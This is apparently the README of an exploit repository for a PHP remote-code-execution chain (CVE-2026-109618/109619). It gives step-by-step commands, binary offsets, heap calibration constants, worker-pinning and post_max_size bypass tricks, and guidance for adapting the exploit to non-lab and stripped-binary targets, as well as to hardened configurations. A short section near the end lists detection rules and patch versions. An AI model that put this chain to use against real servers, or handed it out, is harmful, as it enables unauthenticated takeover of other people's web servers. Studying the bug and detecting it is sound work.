# php2shell 复现环境

针对 CVE-2026-109618 / CVE-2026-109619 的本地复现。两个 PHP 版本各一个文件夹，互不影响。

## 这是什么

2026-10-21 PHP 官方发布 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35，修了这两个漏洞。这个仓库是我在
官方镜像上把它们重新打一遍的环境：起一个单 worker 的 Apache + mod_php，用三个普通的
multipart POST 完成「泄漏堆基址 → 泄漏 libphp 基址 → 伪造 HashTable 调 zif_system」，
全程纯 HTTP，不用碰目标的页面代码，不需要认证。

实测 8.5.11 和 8.4.26 都能打出 `uid=33(www-data)`。

## 怎么用

`exploit.py` **只做 HTTP**：偏移和堆常量全从命令行传，它不读 docker、不读配置文件、不调外部工具。
所以第一步是查标定表拿两个偏移：

```bash
# 1) 查这两个偏移（用什么镜像就打哪个）
python3 calibrate/calib_lookup.py --tag php:8.5.11-apache      # zif=0x5996e0 dtor=0x7b47a0
python3 calibrate/calib_lookup.py --tag php:8.4.26-apache      # zif=0x465370 dtor=0x65eb60

# 2) 起靶标
cd php8.5.11
docker compose up -d

# 3) 打
python3 exploit.py -u http://127.0.0.1:8088/index.php \
        --zif-offset 0x5996e0 --dtor-offset 0x7b47a0
```

8.4.26 一样，只是端口是 8089、偏移换一组：

```bash
cd php8.4.26
docker compose up -d
python3 exploit.py -u http://127.0.0.1:8089/index.php \
        --zif-offset 0x465370 --dtor-offset 0x65eb60
```

成功的话最后一行是：

```
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`out/p1` 里会落同样的内容（默认命令是 `id>/out/p1`，容器把 `./out` 挂到了 `/out`）。

## 命令行参数

| 参数 | 默认 | 说明 |
|---|---|---|
| `-u/--url` | 必填 | 目标 URL |
| `-c/--cmd` | `id>/out/p1` | 要执行的命令，**最多 14 字节**（167 字节 carrier）；长命令用 `sh</out/c` 这种短触发 |
| `--zif-offset` | 必填 | `zif_system` 相对 libphp 基址的偏移 |
| `--dtor-offset` | 必填 | `zval_ptr_dtor` 相对 libphp 基址的偏移 |
| `--htdata-offset` | `0x690d8` | 假 HashTable 用的那个字符串相对 chunk base 的偏移 |
| `--stage1-n` | `841` | stage1 表单字段数 |
| `--stage2-t` / `--stage2-v` | `406` / `16` | stage2 放 16 个元素的下标 / 每个字段长度 |
| `--pads` | `31:31` ×6 | stage3 摆位，逗号分隔的 `名长:值长` |
| `--carrier` | `string` | stage3 载体：`string`（bookworm 镜像）/ `ref`（自编译那套） |
| `--huge-mb` | `12` | 触发 OOM 的字段大小，**必须大于目标 memory_limit** |
| `--chunked` | 关 | 用 `Transfer-Encoding: chunked` 发大请求（绕 `post_max_size`） |
| `--timeout` / `--retries` | `30` / `3` | 单请求超时 / 每个泄漏 stage 的重试次数 |
| `--proof` | `out/p1` | 从本地哪个文件读证明；传 `''` 就不等证明（打完即返回） |
| `-q/--quiet` | 关 | 只输出结论 |

后四个堆参数（`--htdata-offset/--stage1-n/--stage2-t/--stage2-v/--pads`）默认就是**官方
bookworm 镜像**那一套，换构建族才需要动；具体数值见 `CALIBRATION.md`。

## 两个目录的区别

只有 docker-compose.yml 里的镜像和端口不同（8.5.11 → 8088，8.4.26 → 8089）。
`exploit.py` 是同一份（md5 相同），`docker/php.ini`、`docker/apache.conf` 也一样。

## 几个注意点（都是实测踩出来的）

- **偏移跟着二进制走，不跟版本号走**。8.5.11 官方镜像是 `zif_system=0x5996e0 /
  zval_ptr_dtor=0x7b47a0`，8.4.26 是 `0x465370 / 0x65eb60`；同一份源码自编译出来又是别的值。
  所以脚本不猜偏移，必须显式给（不给直接报错退出）。
- **必须单 worker**。Apache 配置里把 prefork 限制成 1 个 worker，不然 stage2 的
  泄漏请求可能落到别的 worker 上，堆对不上。
- **display_errors 必须开**，`max_input_vars` 必须是默认的 1000。这两个是泄漏的
  前提（前者让 `headers_sent` 提前置位，后者让警告在最合适的时刻触发）。
- 第一次跑不通很正常，heap 布局每次略有差异，重试两三次一般能成（每个 stage 前都会
  先 rotate 一次拿干净的 worker）。
- HTTPS 目标默认不校验证书（自签也能打）。
- 如果目标是默认 `memory_limit=128M`、`post_max_size=8M`，用 `--chunked --huge-mb 140`。
- `--proof` 只影响本地怎么判断成功：路径要和目标上命令的落地路径对应。对不上会报
  `EXPLOIT_FAILED`，但**命令可能已经 blind 执行了**，别只看这一行。

## 换镜像怎么取偏移：标定表

`CALIBRATION.md` 是**按镜像 digest** 的偏移标定表（`calibration.json` 是数据源，
`python3 calibrate/build_table.py` 生成文档）。核心结论：

- **`zif_system` / `zval_ptr_dtor` 跟 digest 走，不跟版本号走**——同版本自编译和官方镜像的偏移能差几万。
  这部分可以用 `calibrate/collect.py` 自动采（读 libphp.so 的 ELF 符号表）。
- **堆标定（`htdata` / `stage1_n` / `stage2_t` / `stage2_v` / `pads`）跟构建族走**，
  官方 bookworm 镜像一族一套（8.4.25、8.4.26、8.5.10、8.5.11 实测同一套常量全部打通），
  换发行版/换 Alpine/自编译就必须重新标。

```bash
python3 calibrate/calib_lookup.py --tag php:8.5.11-apache            # 查表
python3 calibrate/calib_lookup.py --tag php:8.5.11-apache --env      # 输出 ZIF_OFFSET=/DTOR_OFFSET= 两行
python3 calibrate/collect.py --verify php:8.5.13-apache              # 给新镜像扩表（lab 主机上跑）
```

**目标不是官方镜像**（发行版 apt/yum 包、自编译、宝塔、别人的机器）时，`.symtab` 通常被 strip 掉、
`zif_system` 不在导出表里，用函数表扫描找：

```bash
python3 calibrate/find_zif.py /path/to/libphp8.2.so system   # → zif_system 偏移
readelf -sW --dyn-syms /path/to/libphp8.2.so | grep zval_ptr_dtor
```

哪些部分一定要重标、哪些能直接复用，见 `CALIBRATION.md` 末尾「不是 docker 官方镜像：哪些部分一定要改」。

## 目录

```
php8-exp/
├── php8.5.11/            8.5.11 靶标（docker-compose.yml + docker/ + www/ + exploit.py）
├── php8.4.26/            同结构，只是镜像和端口不同；两份 exploit.py md5 相同，改一份记得同步
├── calibrate/            标定工具：collect.py（采）/ calib_lookup.py（查）/ find_zif.py（strip 二进制）
│   └── raw/              采集器原始输出，表的 provenance
├── calibration.json      标定表数据源（镜像按 digest，非镜像按二进制 sha256）
└── CALIBRATION.md        标定表 + 用法 + 踩坑 + 非镜像目标清单（由 json 生成）
```

## 关于代码来源

`exploit.py` 基于公开的 PoC 仓库（9bie/php2shell-bypass-aslr-exp）改的，本地只做了三件事：
TLS 不校验、大请求可选 chunked、去掉所有跟"自动读偏移"相关的旁路（不跑 docker、不读
offsets 文件），把参数摊到命令行。

7.4 的分析脚本 php7421_poc.py 在另一个文件夹里，那条链在 7.4 上结构不一样，详见分析文档。

## 免责

只在自己的环境或者拿到书面授权的目标上用。打别人的站是违法的。

---

## 目录结构

```
php8-exp/
├── README.md              本文件：环境、用法、注意事项
├── FINDINGS.md            ★ 本轮全部实测结论（能打/不能打、踩坑、检测）
├── CALIBRATION.md         堆常量标定方法与数据
├── calibration.json       标定结果
├── php8.5.11/             8.5.11 靶场 + exploit（端口 8088）
├── php8.4.26/             8.4.26 靶场 + exploit（端口 8089）
├── calibrate/             标定工具
├── docs/                  第三方分析与研究文档
│   ├── PHP2Shell-8.5.11-漏洞深度分析.md     本轮的深度分析（gdb 证据）
│   ├── PHP2Shell-leak-8.2-分析.md           8.2 泄漏分析
│   └── RESEARCH_PURE_128M.md                pure 链（display_errors=Off）研究
└── scripts/
    ├── fix_ptr_range.py          ★ 修复指针范围（换环境打不通先跑这个）
    ├── pure_128M_exploit.py      display_errors=Off / 128M / 150 worker 全链
    ├── php7421_poc.py            7.4.21 触发脚本（链不适用，留作研究）
    ├── mk_a1.py / mk_leak_b.py   pure 链的 A1 / B1 构造器
    ├── chunked_send.py           chunked 发包（绕过 post_max_size）
    └── decode_cookie.py          泄漏 cookie 解码
```

---

## 换环境打不通？先跑这个

**这是最常见的坑**：公开脚本普遍把堆指针范围写死成 `0x7f0000000000`，但 Linux ASLR
的 mmap 落点可能是 `0x76xx` / `0x7cxx` / `0x72xx`。结果是**泄漏其实成功了**，
但解析函数把所有指针过滤掉，返回 0，看起来像"堆布局不对、需要重新标定"。

```bash
python3 scripts/fix_ptr_range.py .        # 修复当前目录所有 .py
python3 scripts/fix_ptr_range.py -n .     # 先看看会改什么
```

修复内容：`0x7F0000000000` → `0x500000000000`（下界）。

判断方法：**看泄漏响应的 hexdump**。如果 4096 / 819208 字节里明明有
`0x76a9108a70a0` 这类指针，但脚本报 `no heap pointers`，就是这个坑。

---

## display_errors=Off 也能打

不少人以为关掉 `display_errors` 就能防住，**实测不行**。

| 配置 | 结果 |
|---|---|
| 8.4.26 / display_errors=On / 8M / 单 worker | ✅ RCE |
| 8.4.26 / **display_errors=Off** / **128M** / **150 worker** | ✅ **RCE** |

后者用的是 pure 链（`scripts/pure_128M_exploit.py`），关键点：

1. **worker pinning**：先占住 149 个半截 POST，让 A1/B1/A2/B2 落到同一个 child；
2. **chunked 绕过 post_max_size**：不带 Content-Length → `content_length=0` → 跳过检查；
3. A1 用 860 个 depth-64 嵌套文件字段 + burner，让 OOM 精确落在 `php_url_encode`；
4. B1 伪造 zend_string 头，一次读 800KB，同时拿到 chunk base 和 libphp base。

实测输出：
```
pinned 150/150 workers (149 holders)
[try 1] decoded=819208 zval_ptr_dtor=0x7c1a77183b60 -> libphp=0x7c1a76b25000
[4/4] RCE OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 哪些环境打不了

| 目标 | 结论 |
|---|---|
| nginx + php-fpm | ❌ 链不适用。FPM 在 OOM 后**杀 worker 重建**（`exit code 70`），悬空指针留不住；多 worker 更是连堆都不共享 |
| PHP 7.4 / 8.1 及更早 | ❌ 链不适用。`reset_id` 无条件清零 `send_cookie`，且 upload-progress 回调有 `progress->sid` 前置检查 |

FPM 那条链（`BG(unserialize)`）是完全不同的机制，需要双 pool + 应用 `session_start()`
+ 能写 session 引用，门槛高得多，见 `FINDINGS.md` 第 2 节。

---

## 检测与缓解

**最有效的单条检测规则**：

```
Set-Cookie: PHPSESSID= 的值长度 > 64 字节
```

正常 session id 是 32 字符，泄漏链会返回 4096 / 819208 字节。这一条能覆盖链 A 和链 B。

日志特征：
```
Session cookie cannot be sent after headers have already been sent
Allowed memory size of ... exhausted
zend_mm_heap corrupted
child pid N exit signal Abort (6)
```

缓解：升级到 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35。无法升级时
`session.upload_progress.enabled=Off` 可直接断链。

**`display_errors=Off` 不是缓解措施。**

详见 `FINDINGS.md` 第 7 节。
